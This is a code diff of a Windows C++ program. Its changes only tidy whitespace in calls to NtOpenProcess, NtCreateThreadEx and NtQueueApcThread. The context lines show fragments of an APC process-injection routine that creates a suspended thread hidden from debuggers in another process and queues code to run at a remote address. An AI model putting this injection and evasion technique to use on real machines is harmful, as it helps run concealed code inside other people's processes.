@@ -50,7 +50,7 @@ int wmain(int argc, wchar_t **argv)
     CLIENT_ID cid = { UlongToHandle(dwPid), NULL };
     OBJECT_ATTRIBUTES oa = { NULL, NULL, NULL, NULL };
 
-    status = NtOpenProcess(&hRemoteProc, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, &oa,    &cid);
+    status = NtOpenProcess(&hRemoteProc, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, &oa, &cid);
     
     if (status < 0) {
         wcout << "[!] NtOpenProcess failed: " << status << endl;
@@ -155,9 +155,9 @@ int wmain(int argc, wchar_t **argv)
     HANDLE hThread = nullptr;
 
     // Create suspended thread in target process
-    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr,    hRemoteProc, (LPTHREAD_START_ROUTINE)lpTargetStart,
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hRemoteProc, (LPTHREAD_START_ROUTINE)lpTargetStart,
                                 NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, NULL,
-                                NULL, NULL,    nullptr);
+                                NULL, NULL, nullptr);
 
     if (status < 0) {
         wcout << "[!] NtCreateThreadEx failed: " << status << endl;
@@ -171,7 +171,7 @@ int wmain(int argc, wchar_t **argv)
         Step 7: Queue APC thread
     ******************************/
 
-    status = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)lpRemoteAddress, NULL,    NULL, NULL);
+    status = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)lpRemoteAddress, NULL, NULL, NULL);
 
     if (status < 0) {
         wcout << "[!] NtQueueApcThread failed: " << status << endl;
